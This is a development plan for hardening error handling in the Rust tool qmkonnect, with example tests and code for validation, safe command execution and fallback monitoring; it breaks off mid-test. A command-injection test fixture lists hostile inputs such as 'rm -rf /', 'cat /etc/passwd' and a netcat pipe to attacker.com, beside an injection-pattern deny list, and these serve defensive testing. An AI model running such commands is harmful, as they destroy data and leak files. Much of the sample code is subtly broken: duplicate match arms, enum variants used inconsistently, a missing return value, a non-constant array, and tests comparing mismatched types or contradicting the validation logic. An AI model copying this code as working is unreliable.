# PRP: End-to-End Error Hardening for Robust External Data Handling

## Feature Goal
Implement comprehensive error hardening across qmkonnect to ensure graceful degradation when encountering malformed external data, preventing application crashes and security vulnerabilities while maintaining full functionality with valid inputs.

## Deliverable
- Replace all unsafe `.unwrap()` calls with proper error handling
- Implement input validation for all external data sources
- Add safe command execution patterns to prevent injection attacks
- Implement graceful degradation when external systems (Hyprland, X11, device APIs) are unavailable
- Add comprehensive error types with context
- Maintain 100% backward compatibility and existing test suite

## Success Definition
- Application continues running even with invalid Hyprland configurations
- No panic points from external data parsing
- All commands execute safely with proper validation
- Existing tests pass without regression
- Service handles malformed user input gracefully

## Context

### YAML Structure

```yaml
codebase_context:
  project_type: "cross-platform system utility"
  primary_languages: ["rust"]
  dependencies:
    core: ["serde", "serde_json", "ctrlc", "block"]
    platform_specific:
      linux: ["hyprland", "hidapi", "libudev"]
      windows: ["winapi", "windows-service"]
      macos: ["core-foundation", "cocoa"]
  external_data_sources:
    - "hyprland IPC socket"
    - "X11 display server"
    - "HID device communication"
    - "configuration TOML files"
    - "system commands (sudo, udevadm, sc, xprop)"
  current_error_handling:
    pattern: "Result<T, Box<dyn Error>>"
    issues: ["33+ unwrap() calls", "insufficient input validation", "unsafe blocks"]
```

### External Research

#### Rust Error Handling Best Practices
- **thiserror crate**: For structured error types with context and formatting
  - URL: https://docs.rs/thiserror/latest/thiserror/
  - Provides `#[error]` macro for structured error definitions
  - Recommended for `no_std` compatible applications

- **anyhow crate**: For error context and chain-of-responsibility
  - URL: https://docs.rs/anyhow/latest/anyhow/
  - Provides `.context()` method for error context addition
  - Good for application-level error handling

- **Safe unwrap patterns**: Use `expect()` with meaningful messages or proper error propagation
  - URL: https://doc.rust-lang.org/book/ch09.html#error-handling
  - Avoid `.unwrap()` in production code entirely

#### Input Validation Patterns
```rust
// Configuration validation with specific error types
#[derive(Debug, thiserror::Error)]
pub enum ValidationError {
    #[error("Invalid vendor ID: {0}. Must be between 1 and 65535")]
    InvalidVendorId(u16),

    #[error("Invalid product ID: {0}. Must be between 1 and 65535")]
    InvalidProductId(u16),

    #[error("Configuration value '{name}' exceeds maximum length of {max}")]
    ValueTooLong { name: String, max: usize },

    #[error("Path '{path}' is outside allowed directories")]
    UnsafePath { path: String },
}
```

#### Safe Command Execution Patterns
```rust
// Prevent command injection by using safe APIs
fn safe_command_execution() -> Result<(), CommandError> {
    // Validate arguments before execution
    let args = validate_command_args(args)?;

    // Use constant command name, never user-provided
    let output = std::process::Command::new("safe-command")
        .args(&args)
        .output()
        .map_err(|e| CommandError::ExecutionFailed(e.to_string()))?;

    // Validate output before processing
    validate_command_output(&output)?;

    Ok(())
}
```

#### Graceful Degradation Strategy
```rust
// Continue operating with limited functionality when components fail
pub struct ResilientMonitor {
    window_monitor: Option<Box<dyn WindowMonitor>>,
    device_monitor: Option<Box<dyn DeviceMonitor>>,
    fallback_mode: FallbackMode,
}

impl ResilientMonitor {
    pub fn start_with_fallbacks(&mut self) -> Result<(), MonitorError> {
        // Try primary monitor first
        if let Some(ref mut monitor) = self.window_monitor {
            match monitor.start() {
                Ok(()) => return Ok(()),
                Err(e) => {
                    eprintln!("Window monitoring failed, enabling fallback: {}", e);
                    self.enable_fallback_mode()?;
                }
            }
        }

        // Continue with degraded functionality
        Ok(())
    }
}
```

### File Patterns and Gotchas

#### Configuration File Handling
- **Location**: `src/core/mod.rs` and any `config.rs` files
- **Current Pattern**: `toml::from_str()` with basic error handling
- **Gotchas**:
  - TOML files can be arbitrarily large (DoS vector)
  - String fields need length validation
  - Numeric fields need range validation
  - Path fields need directory traversal protection

#### Platform Integration Patterns
- **Hyprland**: Socket communication fails when config has invalid values
- **X11**: Command injection through `xprop` output parsing
- **Windows**: Service API calls require proper error handling
- **macOS**: Core Foundation string conversions need null checking

#### Device Communication
- **HID API**: Device enumeration can fail, need retry logic
- **USB Communication**: Malicious devices can send invalid data
- **Timeout Handling**: Device operations need timeout implementation

### Existing Code Analysis Results

#### Critical Vulnerabilities Found:
1. **33+ `.unwrap()` calls** in hot paths that can cause panics
2. **Unsafe blocks** in platform integrations with insufficient validation
3. **Command injection vectors** in Linux udev rule management
4. **No input validation** for configuration values
5. **Resource leaks** when operations fail mid-execution

#### Test Coverage Assessment:
- **Unit Tests**: Present in `src/core/notifier.rs` and `src/platforms/hyprland.rs`
- **Integration Tests**: Limited, mainly focused on happy paths
- **Error Path Testing**: Minimal, most error conditions not tested
- **Security Testing**: None identified

## Implementation Tasks

### Phase 1: Critical Safety Fixes (Priority 1)

#### Task 1.1: Replace Unsafe unwrap() Calls with Test-Driven Approach
**Files**: All `.rs` files
**Test-Driven Implementation Strategy**:
```rust
// Step 1: Create comprehensive test suite first
#[cfg(test)]
mod unwrap_replacement_tests {
    use super::*;

    #[test]
    fn test_potentially_failing_operation_error_cases() {
        // Test all failure modes before implementation
        let test_cases = vec![
            ("empty_string", TestInput::Empty),
            ("null_pointer", TestInput::Null),
            ("invalid_range", TestInput::OutOfRange),
            ("malformed_data", TestInput::Malformed),
        ];

        for (name, input) in test_cases {
            let result = potentially_failing_operation(input);
            assert!(result.is_err(), "Test case '{}' should fail", name);

            // Verify specific error types
            match result.unwrap_err() {
                QMKError::InvalidInput(_) => {}, // Expected
                other => panic!("Unexpected error for '{}': {:?}", name, other),
            }
        }
    }

    #[test]
    fn test_potentially_failing_operation_success_cases() {
        let valid_inputs = vec![
            TestInput::ValidString("test".to_string()),
            TestInput::ValidNumber(42),
            TestInput::ValidConfig(default_config()),
        ];

        for (i, input) in valid_inputs.iter().enumerate() {
            let result = potentially_failing_operation(input);
            assert!(result.is_ok(), "Valid input {} should succeed", i);
        }
    }
}

// Step 2: Implement with comprehensive error handling
let value = potentially_failing_operation()
    .map_err(|e| QMKError::OperationFailed {
        operation: "potentially_failing_operation",
        error: e.to_string(),
        context: ErrorContext::new()
            .add("input_type", input.type_name())
            .add("input_value", input.debug_string()),
    })?;
```

**Property-Based Testing for unwrap() replacements**:
```rust
use proptest::prelude::*;

proptest! {
    #[test]
    fn test_failing_operation_arbitrary_inputs(input in any::<TestInput>()) {
        // Ensure no panics for any input
        let result = potentially_failing_operation(input);
        // Result should be deterministic
        prop_assert!(result.is_ok() || result.is_err());
    }

    #[test]
    fn test_error_context_preserved(input in any::<TestInput>()) {
        let result = potentially_failing_operation(input);
        if let Err(e) = result {
            // Verify error context is preserved
            prop_assert!(e.context().contains_key("input_type"));
        }
    }
}
```

**Validation Requirements**:
- All `.unwrap()` calls replaced with testable error handling
- Each replacement has 100% test coverage before implementation
- Property-based tests for all public APIs
- `cargo clippy -- -D clippy::unwrap_used` passes
- `cargo test --lib unwrap_replacement_tests` passes

#### Task 1.2: Add Input Validation Types with Comprehensive Test Coverage
**Files**: `src/core/mod.rs`, create `src/core/validation.rs`
**Test-First Implementation Strategy**:

```rust
// Step 1: Define validation test matrix
#[cfg(test)]
mod validation_tests {
    use super::*;

    const VALIDATION_TEST_MATRIX: &[(&str, &str, ValidationExpectation)] = &[
        // (input, field_name, expected_result)
        ("", "vendor_id", ValidationExpectation::Error("Must be non-zero")),
        ("0", "vendor_id", ValidationExpectation::Error("Must be non-zero")),
        ("65536", "vendor_id", ValidationExpectation::Error("Must be <= 65535")),
        ("FEED", "vendor_id", ValidationExpectation::Valid),
        ("feed", "vendor_id", ValidationExpectation::Valid),

        // String length tests
        ("", "app_class", ValidationExpectation::Error("Cannot be empty")),
        ("a".repeat(257), "app_class", ValidationExpectation::Error("Exceeds 256 char limit")),
        ("a".repeat(256), "app_class", ValidationExpectation::Valid),

        // Path traversal tests
        ("../../../etc/passwd", "config_path", ValidationExpectation::Error("Path traversal detected")),
        ("./config", "config_path", ValidationExpectation::Valid),
        ("./../../../config", "config_path", ValidationExpectation::Error("Path traversal detected")),

        // Special characters tests
        ("app\x00class", "app_class", ValidationExpectation::Error("Contains null bytes")),
        ("app\x1bclass", "app_class", ValidationExpectation::Error("Contains control characters")),
        ("app-class", "app_class", ValidationExpectation::Valid),
    ];

    #[test]
    fn test_validation_matrix() {
        for (input, field_name, expected) in VALIDATION_TEST_MATRIX {
            let result = validate_field(field_name, input);
            match expected {
                ValidationExpectation::Valid => {
                    assert!(result.is_ok(),
                        "Field '{}' with input '{}' should be valid: {:?}",
                        field_name, input, result);
                }
                ValidationExpectation::Error(expected_msg) => {
                    assert!(result.is_err(),
                        "Field '{}' with input '{}' should be invalid",
                        field_name, input);
                    let error_msg = format!("{}", result.unwrap_err());
                    assert!(error_msg.contains(expected_msg),
                        "Error message '{}' should contain '{}'",
                        error_msg, expected_msg);
                }
            }
        }
    }
}

// Step 2: Implement validation with comprehensive coverage
#[derive(Debug, thiserror::Error)]
pub enum ValidationError {
    #[error("Configuration field '{field}' validation failed: {reason}")]
    InvalidField { field: String, reason: String },

    #[error("Path '{path}' contains invalid sequence: {sequence}")]
    InvalidPathSequence { path: String, sequence: String },

    #[error("String '{value}' contains invalid bytes at position {pos}")]
    InvalidStringBytes { value: String, pos: usize },

    #[error("Numeric value {value} out of valid range [{min}, {max}] for field '{field}'")]
    OutOfRange { field: String, value: i64, min: i64, max: i64 },
}

impl ValidationError {
    pub fn is_security_related(&self) -> bool {
        matches!(self,
            ValidationError::InvalidPathSequence { .. } |
            ValidationError::InvalidStringBytes { .. }
        )
    }
}

pub trait Validatable {
    fn validate(&self) -> Result<(), ValidationError>;
    fn validation_context(&self) -> ValidationContext;
}

// Comprehensive validation implementation
impl Validatable for Config {
    fn validate(&self) -> Result<(), ValidationError> {
        // Vendor ID validation with security checks
        if self.vendor_id == 0 {
            return Err(ValidationError::OutOfRange {
                field: "vendor_id".to_string(),
                value: self.vendor_id as i64,
                min: 1,
                max: 65535,
            });
        }

        // Check for suspicious vendor IDs (potential attack vectors)
        if is_suspicious_vendor_id(self.vendor_id) {
            return Err(ValidationError::InvalidField {
                field: "vendor_id".to_string(),
                reason: "Vendor ID is in suspicious range".to_string(),
            });
        }

        // String validation with comprehensive checks
        if self.app_class.is_empty() {
            return Err(ValidationError::InvalidField {
                field: "app_class".to_string(),
                reason: "Cannot be empty".to_string(),
            });
        }

        // Check for null bytes and control characters
        if let Some(pos) = find_invalid_byte_sequence(&self.app_class) {
            return Err(ValidationError::InvalidStringBytes {
                value: self.app_class.clone(),
                pos,
            });
        }

        // Path validation with traversal protection
        if let Some(config_path) = &self.config_path {
            validate_path_security(config_path)?;
        }

        Ok(())
    }

    fn validation_context(&self) -> ValidationContext {
        ValidationContext::new()
            .add("vendor_id", self.vendor_id.to_string())
            .add("product_id", self.product_id.to_string())
            .add("app_class", &self.app_class)
            .timestamp(std::time::SystemTime::now())
    }
}
```

**Property-Based Tests for Validation**:
```rust
proptest! {
    #[test]
    fn test_vendor_id_arbitrary_values(vendor_id in any::<u16>()) {
        let config = Config { vendor_id, ..Default::default() };
        let result = config.validate();

        // All valid IDs (1-65535) should pass
        if vendor_id > 0 {
            prop_assert!(result.is_ok());
        }
    }

    #[test]
    fn test_app_class_arbitrary_strings(app_class in "\\PC*") {
        let config = Config { app_class, ..Default::default() };
        let result = config.validate();

        // Should handle any string without panic
        prop_assert!(result.is_ok() || result.is_err());

        // Check for security-related errors
        if let Err(e) = result {
            prop_assert!(!e.is_security_related(),
                "Should not generate security errors for arbitrary input");
        }
    }

    #[test]
    fn test_path_arbitrary_strings(path in any::<String>()) {
        let result = validate_path_security(&path);

        // Should never panic on arbitrary path input
        prop_assert!(result.is_ok() || result.is_err());

        // Should detect path traversal attempts
        if path.contains("../") || path.contains("..\\") {
            prop_assert!(result.is_err());
        }
    }
}
```

**Validation Requirements**:
- 100% line coverage on validation functions before deployment
- All security boundary conditions tested
- Property-based tests for string/numeric inputs
- Path traversal injection tests pass
- Special character handling tests pass

#### Task 1.3: Implement Safe Command Execution with Security Tests
**Files**: `src/platforms/linux.rs`, `src/platforms/windows.rs`, any command execution
**Security-First Test Strategy**:

```rust
// Step 1: Define comprehensive security test cases
#[cfg(test)]
mod command_security_tests {
    use super::*;

    const INJECTION_TEST_CASES: &[(&str, &str)] = &[
        ("'; rm -rf /", "Command injection with semicolon"),
        ("&& cat /etc/passwd", "Command chaining injection"),
        ("| nc attacker.com 4444", "Pipe injection"),
        ("$(whoami)", "Command substitution injection"),
        ("`id`", "Backtick injection"),
        ("<script>alert('xss')</script>", "XSS injection in web contexts"),
        ("../../../etc/passwd", "Path traversal injection"),
        ("\"; sudo rm -rf /", "Quote injection"),
        ("\\x00malicious", "Null byte injection"),
        ("--help\nrm -rf /", "Newline injection"),
        ("*; rm -rf /", "Wildcard injection"),
    ];

    #[test]
    fn test_command_injection_prevention() {
        for (malicious_input, description) in INJECTION_TEST_CASES {
            println!("Testing: {}", description);

            // Test safe command execution
            let result = safe_command_execution(&[malicious_input]);

            assert!(result.is_err(),
                "Should reject malicious input: {}", malicious_input);

            // Verify specific error type
            match result.unwrap_err() {
                CommandError::InvalidArgs(_) | CommandError::SecurityViolation(_) => {
                    // Expected security failure
                }
                other => panic!("Unexpected error type for '{}': {:?}", description, other),
            }
        }
    }

    #[test]
    fn test_safe_command_execution() {
        let safe_inputs = vec![
            "config.json",
            "/usr/share/applications",
            "desktop-entry",
            "valid-filename",
        ];

        for input in safe_inputs {
            let result = safe_command_execution(&[input]);
            assert!(result.is_ok(),
                "Safe input should pass: {}", input);
        }
    }

    #[test]
    fn test_command_canonicalization() {
        let symlinks = vec![
            ("safe_link", "/tmp/target"),
            ("../../evil_link", "/etc/passwd"),
        ];

        for (link_name, target) in symlinks {
            // Create test symlinks
            setup_test_symlink(link_name, target);

            let result = safe_command_execution(&[link_name]);
            assert!(result.is_err(),
                "Should reject symlink to dangerous target: {}", link_name);
        }
    }
}

// Step 2: Implement secure command execution
pub struct SafeCommand {
    program: &'static str,
    allowed_args: HashSet<&'static str>,
    require_canonical_paths: bool,
    max_arg_length: usize,
    timeout: Duration,
}

impl SafeCommand {
    pub fn new(program: &'static str) -> Self {
        Self {
            program,
            allowed_args: HashSet::new(),
            require_canonical_paths: true,
            max_arg_length: 1024, // Prevent DoS via long arguments
            timeout: Duration::from_secs(30), // Prevent hanging
        }
    }

    pub fn allow_arg(mut self, arg: &'static str) -> Self {
        self.allowed_args.insert(arg);
        self
    }

    pub fn execute_with_validation(&self, user_args: &[String]) -> Result<String, CommandError> {
        // Security validation before execution
        self.validate_security_constraints(user_args)?;

        // Canonicalize paths to prevent symlink attacks
        let safe_args = if self.require_canonical_paths {
            self.canonicalize_paths(user_args)?
        } else {
            user_args.iter().cloned().collect()
        };

        // Execute with timeout
        let output = tokio::time::timeout(self.timeout, async {
            tokio::process::Command::new(self.program)
                .args(&safe_args)
                .output()
                .await
        }).await??;

        self.validate_output_security(&output)?;
        Ok(String::from_utf8(output.stdout)?)
    }

    fn validate_security_constraints(&self, args: &[String]) -> Result<(), CommandError> {
        // Length validation (DoS protection)
        let total_length: usize = args.iter().map(|s| s.len()).sum();
        if total_length > self.max_arg_length {
            return Err(CommandError::InvalidArgs(format!(
                "Total argument length {} exceeds limit {}", total_length, self.max_arg_length)));
        }

        // Argument validation (allowlist)
        for arg in args {
            if !self.is_arg_allowed(arg) {
                return Err(CommandError::InvalidArgs(format!(
                    "Argument '{}' not in allowlist for command '{}'", arg, self.program)));
            }
        }

        // Injection pattern detection
        for arg in args {
            if self.contains_injection_patterns(arg) {
                return Err(CommandError::SecurityViolation(format!(
                    "Potential injection detected in argument: {}", arg)));
            }
        }

        Ok(())
    }

    fn canonicalize_paths(&self, args: &[String]) -> Result<Vec<String>, CommandError> {
        let mut safe_args = Vec::with_capacity(args.len());

        for arg in args {
            if self.looks_like_path(arg) {
                let path = Path::new(arg);
                let canonical = path.canonicalize()
                    .map_err(|e| CommandError::InvalidPath(format!(
                        "Cannot canonicalize path '{}': {}", arg, e)))?;

                // Verify canonicalized path is still within expected bounds
                self.validate_path_bounds(&canonical)?;
                safe_args.push(canonical.to_string_lossy().to_string());
            } else {
                safe_args.push(arg.clone());
            }
        }

        Ok(safe_args)
    }

    fn is_arg_allowed(&self, arg: &str) -> bool {
        self.allowed_args.contains(&arg) || self.is_valid_literal_value(arg)
    }

    fn contains_injection_patterns(&self, arg: &str) -> bool {
        const INJECTION_PATTERNS: &[&str] = &[
            ";", "&&", "||", "|", "`", "$(", "${",
            "../", "..\\", "\x00", "\n", "\r", "\"", "'",
        ];

        INJECTION_PATTERNS.iter().any(|pattern| arg.contains(pattern))
    }

    fn validate_output_security(&self, output: &std::process::Output) -> Result<(), CommandError> {
        // Check for command injection in output (if command was malformed)
        let stderr = String::from_utf8_lossy(&output.stderr);
        if !stderr.is_empty() {
            return Err(CommandError::ExecutionFailed(stderr.to_string()));
        }

        // Validate output size (prevent DoS via large output)
        if output.stdout.len() > MAX_SAFE_OUTPUT_SIZE {
            return Err(CommandError::OutputTooLarge(output.stdout.len()));
        }

        Ok(())
    }
}
```

**Security Test Coverage**:
- Command injection vectors (shell metacharacters, piping, substitution)
- Path traversal attacks (symlinks, relative paths)
- DoS attacks (long arguments, large output)
- Timeout enforcement for hanging commands
- Output sanitization and validation

### Phase 2: Graceful Degradation with Test-Driven Implementation (Priority 2)

#### Task 2.1: Implement Fallback Monitor System with Comprehensive Testing
**Files**: `src/platforms/mod.rs`, create `src/platforms/resilient.rs`
**Test-Driven Implementation Strategy**:

```rust
// Step 1: Define comprehensive degradation test scenarios
#[cfg(test)]
mod degradation_tests {
    use super::*;

    #[test]
    fn test_monitor_degradation_scenarios() {
        let test_cases = vec![
            ("hyprland_failure", DegradationScenario::HyprlandUnavailable),
            ("device_failure", DegradationScenario::DeviceUnavailable),
            ("config_error", DegradationScenario::ConfigError),
            ("full_failure", DegradationScenario::AllSystemsUnavailable),
        ];

        for (scenario_name, scenario) in test_cases {
            println!("Testing degradation scenario: {}", scenario_name);

            let mut monitor = ResilientPlatformMonitor::new();

            // Simulate the failure
            monitor.simulate_failure(scenario);

            // Test that application continues running
            assert!(monitor.can_continue_operating(),
                "Application should continue with '{}' failure", scenario_name);

            // Verify the current mode is correct
            let expected_mode = match scenario {
                DegradationScenario::HyprlandUnavailable => MonitorMode::Degraded,
                DegradationScenario::DeviceUnavailable => MonitorMode::Degraded,
                DegradationScenario::ConfigError => MonitorMode::Fallback,
                DegradationScenario::AllSystemsUnavailable => MonitorMode::Fallback,
            };

            assert_eq!(monitor.current_mode(), expected_mode,
                "Incorrect mode for scenario '{}': expected {:?}, got {:?}",
                scenario_name, expected_mode, monitor.current_mode());

            // Test functionality at each degradation level
            test_functionality_at_mode(monitor, expected_mode);
        }
    }

    fn test_functionality_at_mode(monitor: &ResilientPlatformMonitor, mode: MonitorMode) {
        match mode {
            MonitorMode::Full => {
                assert!(monitor.has_window_monitoring(), "Full mode should have window monitoring");
                assert!(monitor.has_device_monitoring(), "Full mode should have device monitoring");
            }
            MonitorMode::Degraded => {
                assert!(monitor.has_fallback_window_monitoring(), "Degraded mode should have fallback window monitoring");
                assert!(!monitor.has_device_monitoring(), "Degraded mode should not have device monitoring");
            }
            MonitorMode::Fallback => {
                assert!(monitor.has_minimal_monitoring(), "Fallback mode should have minimal monitoring");
                assert!(!monitor.has_advanced_features(), "Fallback mode should not have advanced features");
            }
        }
    }

    #[test]
    fn test_monitor_recovery_from_degradation() {
        let mut monitor = ResilientPlatformMonitor::new();

        // Start in degraded mode
        monitor.simulate_failure(DegradationScenario::HyprlandUnavailable);
        assert_eq!(monitor.current_mode(), MonitorMode::Degraded);

        // Test recovery
        let recovery_result = monitor.attempt_recovery();
        assert!(recovery_result.is_ok(), "Should be able to recover from degradation");

        assert_eq!(monitor.current_mode(), MonitorMode::Full, "Should be back to full mode after recovery");
    }
}

// Step 2: Implement with comprehensive fallback logic
pub struct ResilientPlatformMonitor {
    primary_monitor: Option<Box<dyn WindowMonitor>>,
    fallback_monitor: Option<Box<dyn WindowMonitor>>,
    device_monitor: Option<Box<dyn DeviceMonitor>>,
    current_mode: MonitorMode,
    health_checker: HealthChecker,
    retry_config: RetryConfig,
}

#[derive(Debug, PartialEq, Clone)]
pub enum MonitorMode {
    Full {       // All systems working normally
        features: EnabledFeatures,
    },
    Degraded {  // Some systems failed, limited functionality
        failed_systems: HashSet<FailedSystem>,
        working_features: EnabledFeatures,
    },
    Fallback {  // Minimal functionality only
        minimal_features: EnabledFeatures,
        failure_reason: String,
    },
}

#[derive(Debug, PartialEq, Eq, Hash, Clone)]
pub enum FailedSystem {
    Hyprland,
    DeviceCommunication,
    ConfigurationError,
    NetworkConnectivity,
    AuthenticationError,
}

#[derive(Debug, PartialEq)]
pub struct EnabledFeatures {
    window_monitoring: bool,
    device_monitoring: bool,
    advanced_features: bool,
}

impl ResilientPlatformMonitor {
    pub fn new() -> Self {
        Self {
            primary_monitor: None,
            fallback_monitor: None,
            device_monitor: None,
            current_mode: MonitorMode::Full { features: EnabledFeatures::all() },
            health_checker: HealthChecker::new(),
            retry_config: RetryConfig::default(),
        }
    }

    pub fn start_with_fallbacks(&mut self) -> Result<(), MonitorError> {
        // Try primary monitor first with comprehensive error handling
        self.start_primary_monitor()?;

        // Start device monitoring independently
        self.start_device_monitoring()?;

        // Begin health monitoring
        self.health_checker.start_monitoring(self.current_mode.clone());

        Ok(())
    }

    fn start_primary_monitor(&mut self) -> Result<(), MonitorError> {
        // Try to create and start primary monitor
        match self.create_primary_monitor() {
            Ok(monitor) => {
                match monitor.start() {
                    Ok(()) => {
                        self.primary_monitor = Some(monitor);
                        self.update_mode(MonitorMode::Full {
                            features: EnabledFeatures::all()
                        });
                        info!("Primary window monitor started successfully");
                    }
                    Err(e) => {
                        warn!("Primary monitor failed: {}, enabling fallback", e);
                        self.enable_fallback_monitoring()?;
                    }
                }
            }
            Err(e) => {
                error!("Cannot create primary monitor: {}", e);
                self.enable_fallback_monitoring()?;
            }
        }
    }

    fn enable_fallback_monitoring(&mut self) -> Result<(), MonitorError> {
        // Try to create fallback monitor
        let fallback_monitor = self.create_fallback_monitor()?;

        match fallback_monitor.start() {
            Ok(()) => {
                self.fallback_monitor = Some(fallback_monitor);
                self.update_mode(MonitorMode::Degraded {
                    failed_systems: self.detect_failed_systems(),
                    working_features: EnabledFeatures::window_only(),
                });
                info!("Fallback monitoring enabled");
            }
            Err(e) => {
                error!("Fallback monitor failed: {}, enabling minimal mode", e);
                self.enable_minimal_mode()?;
            }
        }

        Ok(())
    }

    fn enable_minimal_mode(&mut self) -> Result<(), MonitorError> {
        // Enable absolutely minimal monitoring
        self.update_mode(MonitorMode::Fallback {
            minimal_features: EnabledFeatures::minimal(),
            failure_reason: "All monitors failed".to_string(),
        });

        warn!("Running in minimal mode");
        Ok(())
    }

    fn create_primary_monitor(&self) -> Result<Box<dyn WindowMonitor>, MonitorError> {
        // Try platform-specific monitors in order of preference
        #[cfg(all(target_os = "linux", feature = "hyprland"))]
        {
            if let Ok(monitor) = self.try_create_hyprland_monitor() {
                return Ok(monitor);
            }
        }

        #[cfg(all(target_os = "linux", feature = "x11"))]
        {
            if let Ok(monitor) = self.try_create_x11_monitor() {
                return Ok(monitor);
            }
        }

        // Fall back to generic monitoring
        self.create_generic_monitor()
    }

    fn try_create_hyprland_monitor(&self) -> Result<Box<dyn WindowMonitor>, MonitorError> {
        let mut monitor = HyprlandMonitor::new(true);

        // Test connection with retry logic
        self.retry_config.execute_with_retry(|| {
            match monitor.start() {
                Ok(()) => Ok(Box::new(monitor)),
                Err(e) => {
                    // Check if this is a recoverable error
                    if is_recoverable_hyprland_error(&e) {
                        Err(MonitorError::TemporaryFailure(e))
                    } else {
                        Err(MonitorError::PermanentFailure(e))
                    }
                }
            }
        }).map_err(|e| {
            match e {
                RetryError::Exhausted(permanent) => *permanent,
                RetryError::Exhausted(temporary) => MonitorError::RetryExhausted {
                    cause: temporary,
                    attempts: self.retry_config.max_attempts,
                },
                RetryError::OperationFailed(op_error) => op_error,
            }
        })
    }

    pub fn simulate_failure(&mut self, scenario: DegradationScenario) {
        match scenario {
            DegradationScenario::HyprlandUnavailable => {
                if let Some(ref mut monitor) = self.primary_monitor {
                    let _ = monitor.stop();
                }
                self.primary_monitor = None;
            }
            DegradationScenario::DeviceUnavailable => {
                if let Some(ref mut monitor) = self.device_monitor {
                    let _ = monitor.stop();
                }
                self.device_monitor = None;
            }
            DegradationScenario::ConfigError => {
                // Simulate configuration errors that prevent normal operation
                self.update_mode(MonitorMode::Fallback {
                    minimal_features: EnabledFeatures::minimal(),
                    failure_reason: "Configuration error".to_string(),
                });
            }
            DegradationScenario::AllSystemsUnavailable => {
                // Simulate complete failure
                self.update_mode(MonitorMode::Fallback {
                    minimal_features: EnabledFeatures::none(),
                    failure_reason: "All systems unavailable".to_string(),
                });
            }
        }
    }

    pub fn can_continue_operating(&self) -> bool {
        match self.current_mode {
            MonitorMode::Full { .. } => true,
            MonitorMode::Degraded { .. } => true,
            MonitorMode::Fallback { .. } => true,
        }
    }

    pub fn current_mode(&self) -> &MonitorMode {
        &self.current_mode
    }

    fn update_mode(&mut self, new_mode: MonitorMode) {
        let old_mode = std::mem::replace(&mut self.current_mode, new_mode);
        self.notify_mode_change(&old_mode, &new_mode);
    }

    fn notify_mode_change(&self, old_mode: &MonitorMode, new_mode: &MonitorMode) {
        info!("Monitor mode changed from {:?} to {:?}", old_mode, new_mode);

        // Log mode change for debugging
        match new_mode {
            MonitorMode::Full { features } => {
                info!("Full mode enabled with features: {:?}", features);
            }
            MonitorMode::Degraded { failed_systems, working_features } => {
                warn!("Degraded mode - failed systems: {:?}, working features: {:?}",
                        failed_systems, working_features);
            }
            MonitorMode::Fallback { minimal_features, failure_reason } => {
                error!("Fallback mode - minimal features: {:?}, reason: {}",
                        minimal_features, failure_reason);
            }
        }
    }

    fn has_window_monitoring(&self) -> bool {
        match self.current_mode {
            MonitorMode::Full { features } => features.window_monitoring,
            MonitorMode::Degraded { working_features } => working_features.window_monitoring,
            MonitorMode::Fallback { minimal_features } => minimal_features.window_monitoring,
        }
    }

    fn has_device_monitoring(&self) -> bool {
        match self.current_mode {
            MonitorMode::Full { features } => features.device_monitoring,
            MonitorMode::Degraded { working_features } => working_features.device_monitoring,
            MonitorMode::Fallback { minimal_features } => minimal_features.device_monitoring,
        }
    }

    pub fn attempt_recovery(&mut self) -> Result<(), MonitorError> {
        info!("Attempting recovery from degraded state");

        // Try to restart failed systems
        let failed_systems = match &self.current_mode {
            MonitorMode::Degraded { failed_systems, .. } => failed_systems.clone(),
            MonitorMode::Fallback { .. } => {
                // In fallback mode, try to recover all systems
                HashSet::from([
                    FailedSystem::Hyprland,
                    FailedSystem::DeviceCommunication,
                    FailedSystem::ConfigurationError,
                ])
            }
            _ => return Ok(()), // Already in full mode
        };

        let mut recovered_systems = HashSet::new();

        for system in failed_systems.iter() {
            match self.try_recover_system(system) {
                Ok(()) => {
                    recovered_systems.insert(system.clone());
                    info!("Successfully recovered system: {:?}", system);
                }
                Err(e) => {
                    warn!("Failed to recover system {:?}: {}", system, e);
                }
            }
        }

        // Update mode based on recovery results
        let remaining_failures = failed_systems.difference(&recovered_systems);
        if remaining_failures.is_empty() {
            self.update_mode(MonitorMode::Full { features: EnabledFeatures::all() });
            info!("Full recovery successful");
        } else {
            self.update_mode(MonitorMode::Degraded {
                failed_systems: remaining_failures,
                working_features: self.calculate_working_features(&remaining_failures),
            });
        }

        Ok(())
    }
}
```

#### Task 2.2: Add Retry and Timeout Logic with Comprehensive Test Coverage
**Files**: `src/core/notifier.rs`, device communication code
**Test-First Implementation Strategy**:

```rust
// Step 1: Define comprehensive retry test scenarios
#[cfg(test)]
mod retry_tests {
    use super::*;
    use std::sync::{Arc, Mutex};
    use std::time::Duration;

    #[test]
    fn test_retry_config_success_after_failures() {
        let mut attempt_count = 0;
        let operation = || {
            attempt_count += 1;
            if attempt_count < 3 {
                Err("Simulated failure".into())
            } else {
                Ok("Success result")
            }
        };

        let config = RetryConfig::new()
            .with_max_attempts(5)
            .with_base_delay(Duration::from_millis(100))
            .with_max_delay(Duration::from_millis(1000))
            .with_backoff_multiplier(2.0);

        let result = config.execute_with_retry(operation);
        assert!(result.is_ok());
        assert_eq!(attempt_count, 3);
        assert_eq!(result.unwrap(), "Success result");
    }

    #[test]
    fn test_retry_config_exhaustion() {
        let operation = || Err("Permanent failure".into());

        let config = RetryConfig::new()
            .with_max_attempts(3)
            .with_base_delay(Duration::from_millis(50));

        let result = config.execute_with_retry(operation);
        assert!(result.is_err());

        match result.unwrap_err() {
            RetryError::Exhausted(_) => {}, // Expected
            other => panic!("Unexpected retry error: {:?}", other),
        }
    }

    #[test]
    fn test_retry_config_exponential_backoff() {
        let delays = Arc::new(Mutex::new(Vec::new()));
        let delays_clone = Arc::clone(&delays);

        let operation = || {
            let attempt_num = delays_clone.lock().unwrap().len() + 1;
            let _ = delays_clone.lock().unwrap().push(attempt_num);

            if attempt_num < 4 {
                Err("Simulated failure".into())
            } else {
                Ok("Success")
            }
        };

        let start_time = std::time::Instant::now();
        let config = RetryConfig::new()
            .with_base_delay(Duration::from_millis(10))
            .with_backoff_multiplier(2.0)
            .with_max_attempts(5);

        let _ = config.execute_with_retry(operation);
        let elapsed = start_time.elapsed();

        // Verify delays: 10, 20, 40, 80 (exponential backoff)
        let recorded_delays = delays.lock().unwrap();
        assert_eq!(recorded_delays.len(), 4);

        let expected_delays: Vec<Duration> = vec![
            Duration::from_millis(10),   // First attempt
            Duration::from_millis(20),   // Second attempt
            Duration::from_millis(40),   // Third attempt
            Duration::from_millis(80),   // Fourth attempt
        ];

        for (i, expected_delay) in expected_delays.iter().enumerate() {
            // Due to execution time, allow some variance
            assert!(recorded_delays[i] >= *expected_delay);
        }
    }

    #[test]
    fn test_retry_with_timeout_protection() {
        let slow_operation = || {
